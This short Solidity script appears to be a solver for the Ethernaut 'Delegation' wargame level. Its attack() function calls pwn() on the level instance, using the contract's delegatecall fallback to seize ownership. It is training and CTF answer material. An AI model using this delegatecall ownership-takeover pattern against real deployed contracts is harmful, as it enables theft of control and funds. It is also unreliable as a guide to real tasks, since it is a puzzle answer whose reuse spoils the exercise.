// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Delegation, Delegate} from "ethernaut/levels/Delegation.sol";

contract Check is CheckScript("DELEGATION") {}

contract Solve is SolveScript("DELEGATION") {
    Delegation target;

    constructor() {
        target = Delegation(instance);
    }

    function attack() public override {
        Delegate(address(target)).pwn();
    }
}
